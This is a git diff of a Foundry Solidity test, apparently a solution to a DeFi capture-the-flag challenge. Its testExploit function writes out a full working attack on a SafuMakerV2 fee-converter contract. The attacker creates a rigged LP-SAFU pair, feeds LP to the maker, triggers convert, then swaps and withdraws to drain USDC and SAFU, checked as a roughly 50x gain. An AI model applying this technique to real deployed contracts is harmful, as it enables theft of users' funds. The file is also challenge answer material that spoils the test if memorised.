@@ -66,13 +66,12 @@ contract SafuMakerV2Test is Test {
 
     usdc = new Token("USDC", "USDC");
     vm.label(address(usdc), "USDC");
-
-    usdc.mint(attacker, 100);
-    usdc.mint(address(this), 1000000);
+    usdc.mint(address(this), 1_000_000e18);
+    usdc.mint(attacker, 100e18);
 
     safu = new Token("SAFU", "SAFU");
-    safu.mint(attacker, 100);
-    safu.mint(address(this), 1000000);
+    safu.mint(address(this), 1_000_000e18);
+    safu.mint(attacker, 100e18);
 
     weth = new WETH9();
 
@@ -82,7 +81,6 @@ contract SafuMakerV2Test is Test {
             abi.encode(address(this)) // feeToSetter
         )
     );
-
     safuRouter = ISafuRouter(
         deployCode(
             "./build-uniswap/v2/UniswapV2Router02.json",
@@ -91,6 +89,7 @@ contract SafuMakerV2Test is Test {
     );
 
     safuMaker = new SafuMakerV2(address(safuFactory), BAR_ADDRESS, address(safu), address(usdc));
+    safuFactory.setFeeTo(address(safuMaker));
 
     usdc.approve(address(safuRouter), type(uint256).max);
     safu.approve(address(safuRouter), type(uint256).max);
@@ -99,24 +98,90 @@ contract SafuMakerV2Test is Test {
     safuRouter.addLiquidity(
       address(usdc),
       address(safu),
-      1000000,
-      1000000,
+      1_000_000e18,
+      1_000_000e18,
       0,
       0,
       address(this),
-      block.timestamp + 100 days
+      block.timestamp
     );
 
-    ISafuPair pair = ISafuPair(safuFactory.getPair(address(usdc), address(safu)));
+    // Get USDC-SAFU pair
+    safuPair = ISafuPair(safuFactory.getPair(address(usdc), address(safu)));
 
     // Simulates trading activity, as LP is issued to feeTo address for trading rewards
-    IERC20(address(pair)).transfer(address(safuMaker), 10000); // 1% of LP
+    IERC20(address(safuPair)).transfer(address(safuMaker), 10_000e18); // 1% of LP
   }
 
   function testExploit() public {
     // Exploit start
-    vm.startPrank(attacker);
+    vm.startPrank(attacker, attacker);
 
+    // Setting approval of base tokens
+    usdc.approve(address(safuRouter), type(uint256).max);
+    safu.approve(address(safuRouter), type(uint256).max);
+
+    // Getting LP tokens for SAFU-USDC pool
+    safuRouter.addLiquidity(
+      address(usdc),
+      address(safu),
+      10e18,
+      10e18,
+      0,
+      0,
+      attacker,
+      block.timestamp
+    );
+
+    // Approving LP tokens for use
+    IERC20(address(safuPair)).approve(address(safuRouter), type(uint256).max);
+
+    // Creating a new pair of LP-SAFU
+    safuRouter.addLiquidity(
+      address(safuPair),
+      address(safu),
+      10e18,
+      100,
+      0,
+      0,
+      attacker,
+      block.timestamp
+    );
+
+    ISafuPair attackerPair = ISafuPair(safuFactory.getPair(address(safuPair), address(safu)));
+
+    // Sending some LP of new pair to safuMaker & converting reward funds to SAFU
+    uint256 attackerLP = attackerPair.balanceOf(attacker);
+
+    // Transfer 10% of LP
+    IERC20(address(attackerPair)).transfer(address(safuMaker), attackerLP / 10);
+
+    safuMaker.convert(address(safu), address(safuPair));
+
+    address[] memory path = new address[](2);
+    path[0] = address(safu);
+    path[1] = address(safuPair);
+
+    // Swapping into attack LP pool to get most of the safuPair LP tokens
+    // Remove liquidity is better than swap, done for laziness bc underflow
+    safuRouter.swapTokensForExactTokens(
+      5000e18,
+      1000,
+      path,
+      attacker,
+      block.timestamp
+    );
+
+    // Removing liquidity for the safuPair LP - receive USDC & SAFU
+    safuRouter.removeLiquidity(
+      address(usdc),
+      address(safu),
+      safuPair.balanceOf(attacker),
+      0,
+      0,
+      attacker,
+      block.timestamp
+    );
 
     vm.stopPrank();
     // Exploit end
@@ -125,7 +190,8 @@ contract SafuMakerV2Test is Test {
   }
 
   function validate() private {
-    assertEq(usdc.balanceOf(attacker), 500);
-    assertEq(safu.balanceOf(attacker), 500);
+    // x50
+    assertGt(usdc.balanceOf(attacker), 5_000e18);
+    assertGt(safu.balanceOf(attacker), 1_000e18);
   }
 }
